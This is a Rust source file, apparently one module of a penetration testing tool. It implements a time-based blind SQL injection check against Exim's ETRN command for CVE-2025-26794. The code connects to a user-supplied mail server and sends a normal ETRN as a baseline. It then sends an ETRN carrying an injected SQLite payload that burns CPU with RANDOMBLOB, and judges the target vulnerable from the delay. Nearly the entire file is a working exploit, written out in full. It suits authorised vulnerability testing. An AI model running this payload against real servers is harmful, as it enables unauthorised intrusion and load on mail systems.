use anyhow::{Result, Context};
use colored::*;
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use std::time::Duration;
use tokio::time::Instant;
use crate::utils::{prompt_required, normalize_target, prompt_default};

/// Exim ETRN SQL Injection (CVE-2025-26794)
/// 
/// Time-based SQL injection in Exim's ETRN command when using SQLite backend.
/// Ported from PHP PoC.

pub async fn run(target: &str) -> Result<()> {
    print_banner();

    let raw_ip = if target.is_empty() {
        prompt_required("Target IP").await?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    
    // User requested port selection. Default is 25.
    let port_str = prompt_default("Target Port", "25").await?;
    let port: u16 = port_str.parse().context("Invalid port")?;

    println!("{} Target: {}:{}", "[*]".blue(), target_ip, port);
    
    // Test logic:
    // 1. Normal Request: "ETRN #test" -> Measure Time
    // 2. Delayed Request: "ETRN #',1); SELECT ... RANDOMBLOB(10000000) ..." -> Measure Time
    // 3. Compare difference.
    
    let normal_time = measure_response(&target_ip, port, "ETRN #test\r\n").await?;
    println!("{} Normal Response Time: {:.3}s", "[*]".blue(), normal_time.as_secs_f64());
    
    // SQLite Delay Payload from PoC
    // SELECT 1 FROM tbl WHERE 1234=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000))))
    // This payload causes CPU intensive operation, delaying response.
    let delay_payload = "SELECT 1 FROM tbl WHERE 1234=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000))))";
    let sqli_payload = format!("#',1); {} /*", delay_payload);
    let malicious_command = format!("ETRN {}\r\n", sqli_payload);
    
    println!("{} Sending time-based SQLi payload...", "[*]".blue());
    let delayed_time = measure_response(&target_ip, port, &malicious_command).await?;
    println!("{} Delayed Response Time: {:.3}s", "[*]".blue(), delayed_time.as_secs_f64());
    
    let diff = delayed_time.as_secs_f64() - normal_time.as_secs_f64();
    println!("{} Time Difference: {:.3}s", "[*]".blue(), diff);
    
    // PoC uses 0.3s threshold
    if diff > 0.3 {
        println!("{} VULNERABLE to CVE-2025-26794 (Exim ETRN SQLi)!", "[+]".green().bold());
    } else {
        println!("{} Not vulnerable or target not using SQLite backend.", "[-]".red());
    }

    Ok(())
}

async fn measure_response(host: &str, port: u16, command: &str) -> Result<Duration> {
    let addr = format!("{}:{}", host, port);
    let mut stream = TcpStream::connect(&addr).await.context("Failed to connect")?;
    
    // Read Banner
    let mut buf = vec![0u8; 1024];
    let _ = stream.read(&mut buf).await?;
    
    // Send EHLO first (often required)
    stream.write_all(b"EHLO test.com\r\n").await?;
    let _ = stream.read(&mut buf).await?;
    
    // Send Command
    let start = Instant::now();
    stream.write_all(command.as_bytes()).await.context("Failed to send command")?;
    
    // Read Response
    let _ = stream.read(&mut buf).await?;
    let duration = start.elapsed();
    
    Ok(duration)
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║    Exim ETRN Blind SQLi (CVE-2025-26794)                  ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
